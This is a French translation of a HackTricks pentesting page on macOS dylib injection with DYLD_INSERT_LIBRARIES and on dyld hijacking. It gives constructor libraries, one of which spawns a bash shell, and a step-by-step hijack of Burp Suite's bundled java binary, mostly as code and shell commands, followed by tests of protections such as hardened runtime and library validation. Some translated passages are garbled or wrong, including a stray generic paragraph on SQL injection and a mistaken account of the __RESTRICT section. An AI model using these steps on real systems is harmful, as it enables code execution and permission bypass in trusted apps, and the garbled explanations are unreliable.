# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Exemple basique de DYLD\_INSERT\_LIBRARIES

**Bibliothèque à injecter** pour exécuter un shell :
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
}
```
Binaire à attaquer:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injection:

Injection:

L'injection est une technique couramment utilisée en piratage pour exploiter les vulnérabilités des applications. Elle consiste à insérer du code malveillant dans une application ou un système afin de compromettre sa sécurité. L'injection peut se produire de différentes manières, telles que l'injection SQL, l'injection de commandes, l'injection de code, etc. Ces attaques peuvent permettre à un attaquant d'exécuter du code arbitraire, de voler des informations sensibles, de contourner les mécanismes de sécurité, voire de prendre le contrôle complet du système. Pour se protéger contre les attaques par injection, il est essentiel de mettre en place des mesures de sécurité appropriées, telles que la validation et l'échappement des entrées utilisateur, l'utilisation de requêtes préparées, la limitation des privilèges d'accès, etc.
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Exemple de détournement de Dyld

Le binaire vulnérable ciblé est `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.

{% tabs %}
{% tab title="LC_RPATH" %}
{% code overflow="wrap" %}
```bash
# Check where are the @rpath locations
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib (offset 12)
```
{% endcode %}
{% endtab %}

{% tab title="@rpath" %}
{% code overflow="wrap" %}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
name @rpath/libjli.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
```
{% endcode %}
{% endtab %}

{% tab title="entitlements" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>
{% endtab %}
{% endtabs %}

Avec les informations précédentes, nous savons qu'il **ne vérifie pas la signature des bibliothèques chargées** et qu'il **essaie de charger une bibliothèque depuis** :

* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`

Cependant, le premier n'existe pas :
```bash
pwd
/Applications/Burp Suite Professional.app

find ./ -name libjli.dylib
./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
```
Alors, il est possible de le pirater ! Créez une bibliothèque qui **exécute un code arbitraire et exporte les mêmes fonctionnalités** que la bibliothèque légitime en la réexportant. Et n'oubliez pas de la compiler avec les versions attendues :

{% code title="libjli.m" %}
```objectivec
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s",argv[0]);
}
```
{% endcode %}

Compilez-le :

{% code overflow="wrap" %}
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
# Note the versions and the reexport
```
{% endcode %}

Le chemin de réexportation créé dans la bibliothèque est relatif au chargeur, changeons-le pour un chemin absolu vers la bibliothèque à exporter:

{% code overflow="wrap" %}
```bash
#Check relative
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change to absolute to the location of the library
install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib

# Check again
otool -l libjli.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
{% endcode %}

Enfin, copiez-le simplement à l'**emplacement détourné** :

{% code overflow="wrap" %}
```bash
cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```
{% endcode %}

Et **exécutez** le binaire et vérifiez si la **bibliothèque a été chargée** :

<pre class="language-context"><code class="lang-context">./java
<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib détournée dans ./java
</strong>Usage: java [options] &#x3C;mainclass> [args...]
(to execute a class)
</code></pre>

{% hint style="info" %}
Un bon article sur la façon d'exploiter cette vulnérabilité pour abuser des autorisations de la caméra de Telegram peut être trouvé à l'adresse [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{% endhint %}

## Plus grande échelle

Si vous prévoyez d'essayer d'injecter des bibliothèques dans des binaires inattendus, vous pouvez vérifier les messages d'événement pour savoir quand la bibliothèque est chargée à l'intérieur d'un processus (dans ce cas, supprimez le printf et l'exécution `/bin/bash`).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## Vérifier les restrictions

### SUID & SGID
```bash
# Make it owned by root and suid
sudo chown root hello
sudo chmod +s hello
# Insert the library
DYLD_INSERT_LIBRARIES=inject.dylib ./hello

# Remove suid
sudo chmod -s hello
```
### Section `__RESTRICT` avec le segment `__restrict`

La section `__RESTRICT` est une section spéciale dans le binaire macOS qui est utilisée pour restreindre l'accès à certaines fonctionnalités sensibles du système d'exploitation. Cette section est généralement protégée en écriture et en exécution, ce qui la rend difficile à modifier ou à exploiter.

Le segment `__restrict` est utilisé pour définir les restrictions d'accès pour la section `__RESTRICT`. Il spécifie les autorisations d'accès pour les différentes parties du binaire, telles que la lecture, l'écriture et l'exécution. En définissant correctement les autorisations dans ce segment, on peut renforcer la sécurité du binaire en limitant les actions possibles par des attaquants potentiels.

Il est important de noter que la manipulation ou l'exploitation de la section `__RESTRICT` et du segment `__restrict` nécessite des privilèges élevés sur le système. Ces techniques sont souvent utilisées par les chercheurs en sécurité et les hackers lors de l'analyse des binaires macOS pour découvrir des vulnérabilités potentielles ou des moyens d'escalader les privilèges.
```bash
gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
```
### Runtime sécurisé

Créez un nouveau certificat dans le trousseau et utilisez-le pour signer le binaire :

{% code overflow="wrap" %}
```bash
# Apply runtime proetction
codesign -s <cert-name> --option=runtime ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello #Library won't be injected

# Apply library validation
codesign -f -s <cert-name> --option=library ./hello
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert (signs must be from a valid Apple-signed developer certificate)

# Sign it
## If the signature is from an unverified developer the injection will still work
## If it's from a verified developer, it won't
codesign -f -s <cert-name> inject.dylib
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed

# Apply CS_RESTRICT protection
codesign -f -s <cert-name> --option=restrict hello-signed
DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed # Won't work
```
{% endcode %}

{% hint style="danger" %}
Notez que même s'il y a des binaires signés avec le drapeau **`0x0(none)`**, ils peuvent obtenir dynamiquement le drapeau **`CS_RESTRICT`** lorsqu'ils sont exécutés et donc cette technique ne fonctionnera pas sur eux.

Vous pouvez vérifier si un processus a ce drapeau avec (obtenez [**csops ici**](https://github.com/axelexic/CSOps)):&#x20;
```bash
csops -status <pid>
```
et vérifiez ensuite si le drapeau 0x800 est activé.
{% endhint %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
